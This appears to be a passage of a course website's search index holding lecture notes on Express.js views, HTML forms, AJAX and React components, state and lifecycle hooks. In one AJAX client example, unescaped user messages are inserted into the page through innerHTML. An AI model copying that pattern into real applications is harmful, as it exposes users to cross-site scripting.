res.send(`${JSON.stringify(messages)}`); }); Cohort Exercise (Graded) Continue with the staff and dept app (with either Mongo or MySQL database), and create the following views a view to add staff a view to add dept a view to retrieve a list of departments a view to retrieve a list of staffs","title":"50.003 - Express.js Frontend View and JQuery"},{"location":"notes/l6_1_expressjs_frontend/#50003-expressjs-frontend-view-and-jquery","text":"","title":"50.003 - Express.js Frontend View and JQuery"},{"location":"notes/l6_1_expressjs_frontend/#learning-outcomes","text":"By the end of this unit, you should be able to Develop web app frontend using HTML Form Develop web app frontend using AJAX This is unit, we study the different approaches of developing frontend components of a web application. Recall that the View modules in a MVC model are dedicated to handle user inputs and renders the requested results.","title":"Learning Outcomes"},{"location":"notes/l6_1_expressjs_frontend/#view","text":"Let's take our echo app as example, when we visit https://localhost:3000/ The web app is triggering the following route in the routes/index.js . /* GET home page. */ router.get('/', function(req, res, next) { res.render('index', { title: 'Express' }); }); In the above we call res.render() which takes two parameters. 1. index , the view template, ( ./views/index.ejs ). 2. An object { title: 'Express'} . it passes the object to the view template <!DOCTYPE html> <html> <head> <title><%= title %></title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <h1><%= title %></h1> <p>Welcome to <%= title %></p> </body> </html> Note that in the view template, we are using mostly HTML syntax, except that we have some special tagged element <%= title %> which are the place-holders for the data to displayed. When res.render() is called with the view template and the object, the value associated with title , i.e. Express is being substituted to the tagged elements. As result, the following will be rendered on the client browser, <!DOCTYPE html> <html> <head> <title>Express</title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <h1>Express</h1> <p>Welcome to Express</p> </body> </html>","title":"View"},{"location":"notes/l6_1_expressjs_frontend/#exercise","text":"Change the value Express in the object to Echo App , restart the app and see the change.","title":"Exercise"},{"location":"notes/l6_1_expressjs_frontend/#adding-view-to-the-echo-app","text":"Let's create a template in views/ named echo.ejs , with the following <!DOCTYPE html> <html> <head> <title><%= title %></title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <div>Enter Your Message:</div> <div><input id=\"message\" type=\"text\"/> </div> <div><input id=\"sendButton\" type=\"button\" value=\"Send\"/></div> </body> </html> Next we modify the routes/echo.js by inserting the following code snippet before the export statement. router.get('/', function(req, res, next) { res.render(`echo`, { 'title': \"Echo App\"}); }) Now if we launch our web app, and open the link http://localhost:3000/echo/ we should see a page with a text label, a text field input and a button. But clicking on the button renders no effect. There are at least two ways to add the effect of clicking the Send button and sending the message to the database.","title":"Adding View to the Echo App"},{"location":"notes/l6_1_expressjs_frontend/#approach-1-using-a-form","text":"For now let's go with the approach which involves a form Duplicate the template echo.ejs into another file echoform.ejs , with the following adjustment <!DOCTYPE html> <html> <head> <title><%= title %></title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <form action=\"/echo/submit\" method=\"post\"> <div>Enter Your Message:</div> <div><input id=\"message\" name=\"message\" type=\"text\"/> </div> <div><input type=\"submit\" value=\"Send\"/></div> </form> <ol> <% for (var i = 0; i < messages.length; i++) { %> <li> <div><%=messages[i].time%></div><div><%=messages[i].msg%></div> </li> <% } %> </ol> </body> </html> First we wrapped the 3 div elements in the body with a form tag. A HTML form capture the inputs from its child elements and converts into a form, where each input value is assocated with a name. Thus in the input text element, we added a name attribute message . For the button, we changed its type from button to submit to indicate that when this button is clicked the form should be submitted. The action attribute of the form element indicate the destination of the end point, the method is HTTP POST. Below the form, we have an HTML order list element ol , whose content will be generated via the embedded javscript template language. In this case, we expect that the route handler will return an object containing a title and a messages list. By using a for loop, we expand the list of messages into a sequence of list items li . Within each li element, we render the message's time and text. Next we update the routes/echo.js as follows const express = require('express'); // existing const model = require('../models/message.js'); // existing var router = express.Router(); // existing /* GET echo listing. */ router.get('/:msg', async function(req, res, next) { // existing const msg = req.params.msg; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); console.log(messages); res.send(`${JSON.stringify(messages)}`); }); router.get('/', async function(req, res, next) { // updated const messages = await model.all(); res.render(`echoform`, { 'title': \"Echo App\",'messages': messages}); }); router.post('/submit', async function(req, res, next) { // new const msg = req.body.message; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); console.log(messages); res.render(`echoform`, { 'title': \"Echo App\", 'messages': messages}); }); module.exports = router; // existing In the second routing rule, we listen to the local URL path /echo/ , and retrieve all the messags, and render the result in the echoform template. This is to handle user accessing http://localhost:3000/echo In the third routing rule, we liste ot the local URL path /echo/submit over HTTP POST, we retrieve the message (via element name attribute = \"message\"), create a new message, retrieve all the messages from the model and render the result in the echoform template. Being different from HTTP GET, parameters of the requests submited via HTTP POST are packaged into the body of the request instead of being exposed as part of the URL. Technically speaking, users can't access a HTTP POST endpoint directly via the browser URL links or navigation bar. To allow the form data embeded in the HTTP POST request to be parsed, we add the following to the app.js const bodyParser = require('body-parser'); // new app.use(bodyParser.urlencoded({ extended: true })); // new app.use('/', indexRouter); // existing app.use('/users', usersRouter) // existing","title":"Approach 1: using a form"},{"location":"notes/l6_1_expressjs_frontend/#approach-2-using-ajax","text":"The advantage of Approach 1 is that it is relatively simple to implement and codes are pretty structured. One issue with Approach 1 is that the page echoform is reloaded each time we submit a new message. This is not a big deal when the page is simple with little content. It affects the user experience as the content of the page get complex and a single click would cause the entire page to refresh. To address this issue, we could use AJAX. The idea of AJAX is to divide the view template HTML into sub regions, when a user input is detected, we use the client side javascript to update the affected sub region. We re-start from the point of echo.ejs template again. We copy and modify its content into a new template echoajax.ejs <!DOCTYPE html> <html> <head> <title><%= title %></title> <script src='/javascripts/echoajaxclient.js'> </script> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <div>Enter Your Message:</div> <div><input id=\"message\" type=\"text\"/> </div> <div><input id=\"sendButton\" type=\"button\" value=\"Send\"/></div> <ol id=\"messagesregion\"> </ol> </body> </html> Note that only change we introduce is the div element with id messagesregion and the inclusion of the client side javascript echoajaxclient . Next we add echoajaxclient.js file into the subfolder public/javascripts/ . // update the ol with id = \"messagesregion\" in the curent page // input: json contains list of messages // output : none function update_messagesregion(json) { var html = \"\"; for (let i = 0; i < json.length; i++) { const message = json[i]; html += `<li><div>${message.time}</div><div>${message.msg}</div></li>`; } var region = document.getElementById(\"messagesregion\"); region.innerHTML = html; } function handleSendButtonClick() { var message = document.getElementById(\"message\"); var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == 4) { var res = xhr.responseText; var json = JSON.parse(res); update_messagesregion(json); } }; // constructing a HTTP POST request var params = `msg=${message.value}`; xhr.open('POST', `/echo/submit/`, true); //Send the proper header information along with the request xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send(params); } // set up the event listener for the send button // call /echo/all to get the current list of messages function run() { var sendButton = document.getElementById(\"sendButton\"); sendButton.addEventListener(\"click\", handleSendButtonClick); var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4) { var res = xhr.responseText; var json = JSON.parse(res); update_messagesregion(json); } } xhr.open('GET', `/echo/all`); xhr.send(); } document.addEventListener( \"DOMContentLoaded\", run); In the above client side javascript, we call function run when the HTML document is fully rendered. Function run performs two tasks register a call back function handleSendButtonClick to the event of sendButton being click. make an API call to the /echo/all end point to get the list of messages and render it in the messagesregion ordered list. Function handleSendButtonClick is triggered when the button is clicked, it retrieves the value from the input text box and submit an HTTP POST request to the /echo/submit end point to add the message, then extract the lst of messages from the response and render it. We adjust the routes/echo.js with the following routing rules. router.get('/', async function(req, res, next) { res.render(`echoajax`, { 'title': \"Echo App\"}); }); router.get('/all', async function(req, res, next) { const messages = await model.all(); res.send(`${JSON.stringify(messages)}`); }); router.post('/submit/', async function(req, res, next) { const msg = req.body.msg; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); res.send(`${JSON.stringify(messages)}`); });","title":"Approach 2 Using AJAX"},{"location":"notes/l6_1_expressjs_frontend/#cohort-exercise-graded","text":"Continue with the staff and dept app (with either Mongo or MySQL database), and create the following views a view to add staff a view to add dept a view to retrieve a list of departments a view to retrieve a list of staffs","title":"Cohort Exercise (Graded)"},{"location":"notes/l6_2_react/","text":"50.003 - Frontend Development using React.js Learning Outcomes By the end of this unit, you should be able to Explain React Components Explain React States Explain React Lifecycle Explain React Effect Develop a frontend app using React JS Issues with a single monolith web app routes / controllers for view rendering and AJAX calls are intertwined client side JS in the views are not so reusable and not so testable Front End Web App A front end web app detachs the view components from a monolith web app. For example, the following diagram shows that a react.js app runs separately from the express.js web app. In this settings, the express.js becomes a backend API server. The views are now hosted in the react.js app in a separate host address and port. When the client first accesses a page, it vists the react.js app for the desired web page. The React.js app renders the web page by making an API call to the backend server. When it has the JSON data, it inserts the data into the result rendered. In addition, it bundles all the client side JS codes and other static content and sends them client browser as the response. The bundle JS codes becomes the client app which runs in the client browser. In the subsequent requests (initiated by UI control), the AJAX calls are maded directly from the client browser through the client app. This frees up some of the processing time from the web server as more codes are executed within the client browser. Further more, the client side JS codes are hosted and executed (at least during the first request) on the react.js app server. This allows JS codes to be better modularized via a Node JS project, thus testing can be conducted systematically. Building a ReactJS App To initiate the project, we need to execute npx create-react-app my_react_app cd my_react_app We find a project folder with the following content. . \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u2502 \u251c\u2500\u2500 favicon.ico \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 manifest.json \u2502 \u251c\u2500\u2500 logo512.png \u2502 \u2514\u2500\u2500 logo192.png \u2514\u2500\u2500 src \u251c\u2500\u2500 index.css \u251c\u2500\u2500 index.js \u251c\u2500\u2500 App.css \u251c\u2500\u2500 App.js \u251c\u2500\u2500 App.test.js \u251c\u2500\u2500 setupTests.js \u251c\u2500\u2500 reportWebVitals.js \u2514\u2500\u2500 logo.svg src/index.js is the main function (application entry point). import React from 'react'; import ReactDOM from 'react-dom/client'; import './index.css'; import App from './App'; import reportWebVitals from './reportWebVitals'; const root = ReactDOM.createRoot(document.getElementById('root')); root.render( <React.StrictMode> <App /> </React.StrictMode> ); reportWebVitals(); From the above we noted a few points, We are using ES6 syntax We mix JavaScript syntax with HTML (XHTML) syntax (as well as CSS). The file is actually in type of JSX instead of JS. index.js is creating a page with a root element and embedding the App element inside. the App element is imported from src/App.js . Let's take a look at the App.js import logo from './logo.svg'; import './App.css'; function App() { return ( <div className=\"App\"> <header className=\"App-header\"> <img src={logo} className=\"App-logo\" alt=\"logo\" /> <p> Edit <code>src/App.js</code> and save to reload. </p> <a className=\"App-link\" href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\" > Learn React </a> </header> </div> ); } export default App; To run the app, we run npm start which will start the reach app at https://localhost:3000 . To stop it, we press control-C in the terminal. As we are going to run both react server and express server simultanously, we need to run the react app in a different port. In the project root folder, create a file .env with the following content PORT=5000 Re-run npm start , it will re-start the react web app at https://localhost:5000 . App.js Let's modify src/App.js to see how the web app change. import logo from './logo.svg'; import './App.css'; function App() { return ( <div> <h1> Echo App </h1> <div> TODO </div> </div> ); } export default App; As we save the file, the browser with the web app running will automatically refresh. We see If we check the source of the HTML page in the browser, <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"utf-8\" /> <link rel=\"icon\" href=\"/favicon.ico\" /> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> <meta name=\"theme-color\" content=\"#000000\" /> <meta name=\"description\" content=\"Web site created using create-react-app\" /> <link rel=\"apple-touch-icon\" href=\"/logo192.png\" /> <!-- manifest.json provides metadata used when your web app is installed on a user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/ --> <link rel=\"manifest\" href=\"/manifest.json\" /> <!-- Notice the use of in the tags above. It will be replaced with the URL of the `public` folder during the build. Only files inside the `public` folder can be referenced from the HTML. Unlike \"/favicon.ico\" or \"favicon.ico\", \"/favicon.ico\" will work correctly both with client-side routing and a non-root public URL. Learn how to configure a non-root public URL by running `npm run build`. --> <title>React App</title> <script defer src=\"/static/js/bundle.js\"></script></head> <body> <noscript>You need to enable JavaScript to run this app.</noscript> <div id=\"root\"></div> <!-- This HTML file is a template. If you open it directly in the browser, you will see an empty page. You can add webfonts, meta tags, or analytics to this file. The build step will place the bundled scripts into the <body> tag. To begin the development, run `npm start` or `yarn start`. To create a production bundle, use `npm run build` or `yarn build`. --> </body> </html> Nothing from the above reflects the change that we made in App.js . If we follow the link /static/js/bundle.js in the browser, we find the following code snippet in the JavaScript file. function App() { return /*#__PURE__*/(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_3__.jsxDEV)(\"div\", { children: [/*#__PURE__*/(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_3__.jsxDEV)(\"h1\", { children: \" Echo App \" }, void 0, false, { fileName: _jsxFileName, lineNumber: 10, columnNumber: 9 }, this), /*#__PURE__*/(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_3__.jsxDEV)(\"div\", { children: \" This is a test app for ESC. \" }, void 0, false, { fileName: _jsxFileName, lineNumber: 11, columnNumber: 11 }, this)] }, void 0, true, { fileName: _jsxFileName, lineNumber: 9, columnNumber: 7 }, this); } _c = App; React JS Compilation React frameworks focus in building applications which can be targeted for multiple platforms, i.e. web browser, windows application, mobile app and etc. It takes a single stack of source languages, i.e. JSX and CSS, compiles them into a single output. In this case, since we are using React JS to build a web app, the output will be in a single JavaScript file. Image credits https://nextjs.org/learn/foundations/how-nextjs-works/compiling Components Unlike Web Application developed using other frameworks, e.g. express.js, React JS develops applications with a single page in mind. With the control of basic components, the React JS app is able to dynamicalliy update and replace components and sub-components within the same page in the event of user interaction and data update. In our running example, function App constructs a component which is used by the index.js at the root level. Function App returns the static HTML code as result. Let's make some change to App.js as follows, import logo from './logo.svg'; import './App.css'; import Echo from './Echo'; function App() { return ( <div> <h1> Echo App </h1> <Echo /> </div> ); } export default App; In the above we import and include an Echo component from ./src/Echo.js , which is defined as as follows, function Echo() { return ( <div> This message is defined in the Echo component. </div> ); } export default Echo; After reloading the app in the browser, we have Top Down design process (static) From the earlier example we see a hierachical structures in the components and elements used in our app. index.js App div h1 Echo div text When we design the UI using React JS we should follow and exted the same structure. Suppose we would like to build a frontend app to interact with the express.js app by submitting new messages and displaying the list of submitted messages. By breaking down the UI components we might have the following By following the UI structural breakdown, we modify the Echo.js as follows, function NewMessageBar({message, onSubmitClick}) { return ( <div> <input type=\"text\" placeholder=\"\" value={message}></input> <button onClick={onSubmitClick}> Submit </button> </div> ); } function MessageList({messages}) { let rows = []; for (let i in messages) { rows.push( <tr><td>{messages[i].time}</td><td>{messages[i].msg}</td></tr> ); } return ( <table> <tbody> <tr><th>Date Time</th><th>Message</th></tr> {rows} </tbody> </table> ); } function Echo() { const messages = [ {'time' : (new Date()).toDateString(), 'msg': 'hello'}, {'time' : (new Date()).toDateString(), 'msg': 'bye'} ]; return ( <div> <NewMessageBar message=\"\" onSubmitClick={() => {}}/> <MessageList messages={messages}/> </div> ); } export default Echo; In the above version of Echo.js , we define two sub components, namely NewMessageBar and MessageList . Note that both functions take some object as the arguments, these objects arguments are referred as props in React's terminlogies. NewMessageBar() takes an object with two attributes, message and onSubmitClick . message stores the text value in the text field and onSubmitclick is a callback when the Submit button is clicked. The function returns a text input field and a button Submit as HTML code. MessageList() takes an object with an attribute, messages which is a list of message objects. It returns a HTML table whose rows are constructed by mapping each message in the list to a row of the table. Echo() , we hard code the data (which is supposed to be returned by the AJAX call to the backend), and pass them to MessageList component during the component construction. Note that we might re-write the component definition using class instead of function. class NewMessageBar extends React.Component { constructor(props) { this.message = props.message; this.onSubmitClick = props.onSubmitClick; } render () { return ( <div> <input type=\"text\" placeholder=\"\" value={this.message}></input> <button onClick={this.onSubmitClick}> Submit </button> </div> ); } } Props As shown in the earlier example, props are the objects arguments being passed to the constructor of a React Component, props carried data and information passed down from the use-site, (or the outer component). Make it interactive (dynamic) Now we need to make the echo app functional. First let's make the button click to respond to the text entered in the input text field. We modify NewMessageBar as follows, function NewMessageBar({message, onMessageChange, onSubmitClick}) { return ( <div> <input type=\"text\" placeholder=\"\" value={message} onChange={(e) => {onMessageChange(e.target.value)}}> </input> <button onClick={onSubmitClick}> Submit </button> </div> ) } We introduce a new props attribtue onMessageChange which is used as the handler for the text field onChange event. Without this, the text field is read-only. Next we modify the Echo function as follows, function Echo() { const [msgTxt, setMsgTxt] = useState(\"\"); function handleSubmitClick() { alert(\"clicked \" + msgTxt); } const messages = [ {'time' : (new Date()).toDateString(), 'msg': 'hello'}, {'time' : (new Date()).toDateString(), 'msg': 'bye'} ]; return ( <div> <NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/> <MessageList messages={messages}/> </div> ); } State The useState builtin function initializes a state . In Reach terminology, a state is a pair of items, an object for reading the state and a callback to signal the change of the state. In this case we have a string object (since we initilaize an empty string), and a callback function which should be called when the string is updated. In addition, we define a function handleSubmitClick which is used as the event handler of the Submit button click. Now we can interact with the app by entering the text in the message text field and pressing the button to trigger a pop up. Interfacing with the backend app Lastly we need to remove the hard-coded data and make use the data returned by the backend API end-point. We encounter an error of the api Call. By checking the console in the browser, we find that it is related to the Cross Origin Resource Sharing (CORS) restriction, which prevents the JS from React app to pull data from an exernal app. To lift the restriction, we modify the router code at the backend app, i.e. my_mysql_app . For all the AJAX call end-points to be accessed by our react app, (which is running on port 5000), we add the following statement before the res.send() is called. res.set('Access-Control-Allow-Origin', 'http://localhost:5000'); Coming back to our React App, we adjust the Echo function as follows, function Echo() { const [msgTxt, setMsgTxt] = useState(\"\"); function handleSubmitClick() { submitNewMessage(); } const [messages, setMessages] = useState([]); async function submitNewMessage() { const response = await fetch(`http://localhost:3000/echo/submit`, { method: 'POST', body: `msg=${msgTxt}`, headers: { 'Content-type': 'application/x-www-form-urlencoded' } }); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } return ( <div> <NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/> <MessageList messages={messages}/> </div> ); } The changes we made include remove the hard coded messages. introduce a new state [messages, setMessages] . define a function submitNewMessage() which make the HTTP POST api request to the backend app and update the message. update the body of handleSubmitClick() to incorporate submitNewMessage() . When the button is clicked, a sequence of operations were carried out in the following order. 1. handleSubmitClick() invokes submitNewMessage() 1. submitNewMessage() make the api call 1. when the api call returns the result, the body text is extracted and parsed as JSON. 1. setMessages() update the messages state, which triggers the re-rendering of the Echo() component. Lastly, let's make the app to displays all the existing messages when it is firstly loaded. Naively, we might added the following function definitions and function call statements before the return statement in the Echo() function. async function submitNewMessage() { ... } // existing async function initMessages() { // newly added const response = await fetch(`http://localhost:3000/echo/all`); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } initMessages(); // newly added, causing loop return ( ... ); // existing With this fix, our App seems to work on the first launch but subsequently it gets into an infinite loop. This is because initMessages() is now part of the render routine of the Echo component, when the Echo is rendered, the messages list is updated, which causes the component to re-render. Life Cycle of React Components In order to fix this issue, we need to understand the life cycle of React Component. image credits https://levelup.gitconnected.com/componentdidmakesense-react-lifecycle-explanation-393dcb19e459 When a React Component is spawned, sever methods are called at the sever end (i.e. when our react app is hosted). After which, it calls componentDidMount , then goes into a kind of loop based on states or propos changes, it will re-renders. The loop goes on until it unmount, (i.e. the component is destroyed). To access each of the stages of the React Component, let's rewrite the Echo component in class style class Echo extends Component { constructor(props) { super(props); this.state = { msgTxt : \"\", messages: []}; } componentDidMount() { } componentDidUpdate() { } async submitNewMessage() { const response = await fetch(`http://localhost:3000/echo/submit`, { method: 'POST', body: `msg=${this.state.msgTxt}`, headers: { 'Content-type': 'application/x-www-form-urlencoded' } }); const text = await response.text(); const json = JSON.parse(text); this.setMessages(json); } setMsgTxt(s) { this.setState({ msgTxt: s, messages : this.state.messages }); } setMessages(l) { this.setState({ msgTxt: this.state.msgTxt, messages : l}); } handleSubmitClick() { this.submitNewMessage(); } render() { return ( <div> <NewMessageBar message={this.state.msgTxt} onMessageChange={(s) => this.setMsgTxt(s)} onSubmitClick={() => this.handleSubmitClick()}/> <MessageList messages={this.state.messages}/> </div> ); } } In the above version, we refactor the parts using the useState() using the inherited attribute of the Component class, state and setState() . In the above example, we put msgTxt and messages in this.state and implement setMsgTxt and setMessages using this.setState . In addition, we lift all the nested functions up by turning them into methods. Since functions are different from method internally, we need to turn the props arguments into lambdas, e.g. onMessageChange={(s) => this.setMsgTxt(s)} instead of onMessageChange={setMsgTxt} . Finally we override the componentDidMount and componentDidUpdate methods. Exercise (Non Graded) Add some log messages to the constructor , componentDidUpdate , componentDidMount and render . Run the program to observe the order of the log messages being printed. Can you identify which message is printed from which part of the life cycle? As suggested by the life cycle, it is better to initilize the state outside the loop, i.e. componentDidMount . Hence we change the componentDidMount as follows, and introduce a new function to retrieve all existing messages from the API and update the state. async initMessages() { const response = await fetch(`http://localhost:3000/echo/all`); const text = await response.text(); const json = JSON.parse(text); this.setMessages(json); } componentDidMount() { this.initMessages(); } With this change, the App behaves as what we want. Effect Some of us might argue, rewriting the component in the class form allows us to access the different stage of the life-cycle. The code could be too verbose. To do archieve the same result in the function form component, we need to use the effect hook. Recall the earlier version in function form. function Echo() { const [msgTxt, setMsgTxt] = useState(\"\"); function handleSubmitClick() { submitNewMessage(); } const [messages, setMessages] = useState([]); async function submitNewMessage() { const response = await fetch(`http://localhost:3000/echo/submit`, { method: 'POST', body: `msg=${msgTxt}`, headers: { 'Content-type': 'application/x-www-form-urlencoded' } }); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } useEffect( () => { // useEffect console.log(\"from effect\"); }); return ( <div> <NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/> <MessageList messages={messages}/> </div> ); } The statement calling useEffect defines a call-back to be called every time the component re-renders. We can restrict the call-back to be triggered only when certain states have updated, e.g. useEffect( () => { console.log(\"from effect\"); }, [msgTxt]); will be triggered whenever msgTxt state changes. If the 2nd argument is an empty list [] . the call-back will only be triggered when the component is mounted. Hence to achieve what we want, i.e. to get all the existing messages and assign them to the state messages , we neeed to include the following in the body of the Echo function. async function initMessages() { const response = await fetch(`http://localhost:3000/echo/all`); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } useEffect( () => { initMessages(); }, []); We could think of useEffect with only 1 argument is behaving like componentDidUpdate . useEffect with a 2nd argument as a non empty list is behaving like componentDidUpdate with conditional update (depeneding on whether the given state has changed). When useEffect is used with a 2nd argument as an empty list it is behaving like componentDidMount . Exercise (Graded) Complete the tasks in ce8_q1. Refer to ce8. Complete the tasks in ce8_q2. Refer to ce8. Further Reading Thinking in React https://react.dev/learn/thinking-in-react React JS and Express JS https://www.freecodecamp.org/news/create-a-react-frontend-a-node-express-backend-and-connect-them-together-c5798926047c/ React JS life cycle https://levelup.gitconnected.com/componentdidmakesense-react-lifecycle-explanation-393dcb19e459 Multi page React https://www.geeksforgeeks.org/how-to-create-a-multi-page-website-using-react-js/ Multi page with state https://www.microverse.org/blog/how-to-get-set-up-with-react-redux-in-your-next-multi-page-project React JS and Express JS with Login and Token authentication https://www.digitalocean.com/community/tutorials/how-to-add-login-authentication-to-react-applications","title":"50.003 - Frontend Development using React.js"},{"location":"notes/l6_2_react/#50003-frontend-development-using-reactjs","text":"","title":"50.003 - Frontend Development using React.js"},{"location":"notes/l6_2_react/#learning-outcomes","text":"By the end of this unit, you should be able to Explain React Components Explain React States Explain React Lifecycle Explain React Effect Develop a frontend app using React JS","title":"Learning Outcomes"},{"location":"notes/l6_2_react/#issues-with-a-single-monolith-web-app","text":"routes / controllers for view rendering and AJAX calls are intertwined client side JS in the views are not so reusable and not so testable","title":"Issues with a single monolith web app"},{"location":"notes/l6_2_react/#front-end-web-app","text":"A front end web app detachs the view components from a monolith web app. For example, the following diagram shows that a react.js app runs separately from the express.js web app. In this settings, the express.js becomes a backend API server. The views are now hosted in the react.js app in a separate host address and port. When the client first accesses a page, it vists the react.js app for the desired web page. The React.js app renders the web page by making an API call to the backend server. When it has the JSON data, it inserts the data into the result rendered. In addition, it bundles all the client side JS codes and other static content and sends them client browser as the response. The bundle JS codes becomes the client app which runs in the client browser. In the subsequent requests (initiated by UI control), the AJAX calls are maded directly from the client browser through the client app. This frees up some of the processing time from the web server as more codes are executed within the client browser. Further more, the client side JS codes are hosted and executed (at least during the first request) on the react.js app server. This allows JS codes to be better modularized via a Node JS project, thus testing can be conducted systematically.","title":"Front End Web App"},{"location":"notes/l6_2_react/#building-a-reactjs-app","text":"To initiate the project, we need to execute npx create-react-app my_react_app cd my_react_app We find a project folder with the following content. . \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u2502 \u251c\u2500\u2500 favicon.ico \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 manifest.json \u2502 \u251c\u2500\u2500 logo512.png \u2502 \u2514\u2500\u2500 logo192.png \u2514\u2500\u2500 src \u251c\u2500\u2500 index.css \u251c\u2500\u2500 index.js \u251c\u2500\u2500 App.css \u251c\u2500\u2500 App.js \u251c\u2500\u2500 App.test.js \u251c\u2500\u2500 setupTests.js \u251c\u2500\u2500 reportWebVitals.js \u2514\u2500\u2500 logo.svg src/index.js is the main function (application entry point). import React from 'react'; import ReactDOM from 'react-dom/client'; import './index.css'; import App from './App'; import reportWebVitals from './reportWebVitals'; const root = ReactDOM.createRoot(document.getElementById('root')); root.render( <React.StrictMode> <App /> </React.StrictMode> ); reportWebVitals(); From the above we noted a few points, We are using ES6 syntax We mix JavaScript syntax with HTML (XHTML) syntax (as well as CSS). The file is actually in type of JSX instead of JS. index.js is creating a page with a root element and embedding the App element inside. the App element is imported from src/App.js . Let's take a look at the App.js import logo from './logo.svg'; import './App.css'; function App() { return ( <div className=\"App\"> <header className=\"App-header\"> <img src={logo} className=\"App-logo\" alt=\"logo\" /> <p> Edit <code>src/App.js</code> and save to reload. </p> <a className=\"App-link\" href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\" > Learn React </a> </header> </div> ); } export default App; To run the app, we run npm start which will start the reach app at https://localhost:3000 . To stop it, we press control-C in the terminal. As we are going to run both react server and express server simultanously, we need to run the react app in a different port. In the project root folder, create a file .env with the following content PORT=5000 Re-run npm start , it will re-start the react web app at https://localhost:5000 .","title":"Building a ReactJS App"},{"location":"notes/l6_2_react/#appjs","text":"Let's modify src/App.js to see how the web app change. import logo from './logo.svg'; import './App.css'; function App() { return ( <div> <h1> Echo App </h1> <div> TODO </div> </div> ); } export default App; As we save the file, the browser with the web app running will automatically refresh. We see If we check the source of the HTML page in the browser, <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"utf-8\" /> <link rel=\"icon\" href=\"/favicon.ico\" /> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> <meta name=\"theme-color\" content=\"#000000\" /> <meta name=\"description\" content=\"Web site created using create-react-app\" /> <link rel=\"apple-touch-icon\" href=\"/logo192.png\" /> <!-- manifest.json provides metadata used when your web app is installed on a user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/ --> <link rel=\"manifest\" href=\"/manifest.json\" /> <!-- Notice the use of in the tags above. It will be replaced with the URL of the `public` folder during the build. Only files inside the `public` folder can be referenced from the HTML. Unlike \"/favicon.ico\" or \"favicon.ico\", \"/favicon.ico\" will work correctly both with client-side routing and a non-root public URL. Learn how to configure a non-root public URL by running `npm run build`. --> <title>React App</title> <script defer src=\"/static/js/bundle.js\"></script></head> <body> <noscript>You need to enable JavaScript to run this app.</noscript> <div id=\"root\"></div> <!-- This HTML file is a template. If you open it directly in the browser, you will see an empty page. You can add webfonts, meta tags, or analytics to this file. The build step will place the bundled scripts into the <body> tag. To begin the development, run `npm start` or `yarn start`. To create a production bundle, use `npm run build` or `yarn build`. --> </body> </html> Nothing from the above reflects the change that we made in App.js . If we follow the link /static/js/bundle.js in the browser, we find the following code snippet in the JavaScript file. function App() { return /*#__PURE__*/(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_3__.jsxDEV)(\"div\", { children: [/*#__PURE__*/(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_3__.jsxDEV)(\"h1\", { children: \" Echo App \" }, void 0, false, { fileName: _jsxFileName, lineNumber: 10, columnNumber: 9 }, this), /*#__PURE__*/(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_3__.jsxDEV)(\"div\", { children: \" This is a test app for ESC. \" }, void 0, false, { fileName: _jsxFileName, lineNumber: 11, columnNumber: 11 }, this)] }, void 0, true, { fileName: _jsxFileName, lineNumber: 9, columnNumber: 7 }, this); } _c = App;","title":"App.js"},{"location":"notes/l6_2_react/#react-js-compilation","text":"React frameworks focus in building applications which can be targeted for multiple platforms, i.e. web browser, windows application, mobile app and etc. It takes a single stack of source languages, i.e. JSX and CSS, compiles them into a single output. In this case, since we are using React JS to build a web app, the output will be in a single JavaScript file. Image credits https://nextjs.org/learn/foundations/how-nextjs-works/compiling","title":"React JS Compilation"},{"location":"notes/l6_2_react/#components","text":"Unlike Web Application developed using other frameworks, e.g. express.js, React JS develops applications with a single page in mind. With the control of basic components, the React JS app is able to dynamicalliy update and replace components and sub-components within the same page in the event of user interaction and data update. In our running example, function App constructs a component which is used by the index.js at the root level. Function App returns the static HTML code as result. Let's make some change to App.js as follows, import logo from './logo.svg'; import './App.css'; import Echo from './Echo'; function App() { return ( <div> <h1> Echo App </h1> <Echo /> </div> ); } export default App; In the above we import and include an Echo component from ./src/Echo.js , which is defined as as follows, function Echo() { return ( <div> This message is defined in the Echo component. </div> ); } export default Echo; After reloading the app in the browser, we have","title":"Components"},{"location":"notes/l6_2_react/#top-down-design-process-static","text":"From the earlier example we see a hierachical structures in the components and elements used in our app. index.js App div h1 Echo div text When we design the UI using React JS 